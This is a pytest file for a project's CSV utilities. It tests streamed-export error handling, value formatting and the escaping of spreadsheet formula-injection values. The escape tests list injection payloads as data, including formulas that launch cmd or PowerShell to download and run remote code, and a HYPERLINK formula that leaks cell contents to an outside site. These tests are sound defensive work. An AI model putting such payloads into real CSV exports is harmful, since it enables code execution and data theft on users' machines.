import datetime
from decimal import Decimal

import pytest

from datahub.core.csv import (
    csv_iterator,
    escape,
    INCOMPLETE_CSV_MESSAGE,
    transform_csv_value,
)


def _rows():
    for i in range(10):
        yield {'id': i}

    raise ValueError


def test_csv_iterator_with_error():
    """
    Tests that an error is appended to the CSV data is an error occurs during generation.

    This is as if the CSV data is being used as part of a streamed HTTP response, it will be to
    late to return an error status.
    """
    row = None

    with pytest.raises(ValueError):
        for row in csv_iterator(_rows(), {'id': 'id'}):  # noqa: B007
            pass

    assert row == INCOMPLETE_CSV_MESSAGE


@pytest.mark.parametrize(
    'value,expected_value',
    (
        (
            Decimal('2000000000000000000000000000000000000'),
            '2000000000000000000000000000000000000',
        ),
        (
            Decimal('200.00'),
            '200',
        ),
        (
            Decimal('200.0'),
            '200',
        ),
        (
            Decimal('200.8919'),
            '200.8919',
        ),
        (
            datetime.datetime(2010, 1, 1, 3, 3, 3),
            '2010-01-01 03:03:03',
        ),
        (
            1000,
            1000,
        ),
        (
            float(1000),
            float(1000),
        ),
        (
            'HELLO',
            'HELLO',
        ),
        # Escape potentially dangerous values
        (
            "=cmd|' /c calc'!'A1",
            "'=cmd\\|' /c calc'!'A1",
        ),
    ),
)
def test_transform_csv_value(value, expected_value):
    """Test transform csv value"""
    assert transform_csv_value(value) == expected_value


@pytest.mark.parametrize('value,expected_value', [
    # Sample dangerous payloads
    ('=1+1', "'=1+1"),
    ('-1+1', "'-1+1"),
    ('+1+1', "'+1+1"),
    ('=1+1', "'=1+1"),
    ('@A3', "'@A3"),
    ('%1', "'%1"),
    ('|1+1', "'\\|1+1"),
    ('=1|2', "'=1\\|2"),
    # https://blog.zsec.uk/csv-dangers-mitigations/
    ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
    (
        "=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
        "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
    ),
    (
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "'@SUM(1+1)*cmd\\|' /C calc'!A0",
    ),
    (
        "@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
        "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
    ),
    # https://hackerone.com/reports/72785
    (
        "-2+3+cmd|' /C calc'!A0",
        "'-2+3+cmd\\|' /C calc'!A0",
    ),
    # https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
    (
        '=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for info")',
        '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for info")',
    ),
])
def test_escape(value, expected_value):
    """
    Test csv escapes potentially malicious values.

    Test cases taken from https://github.com/raphaelm/defusedcsv/blob/master/tests/test_escape.py
    """
    assert escape(value) == expected_value
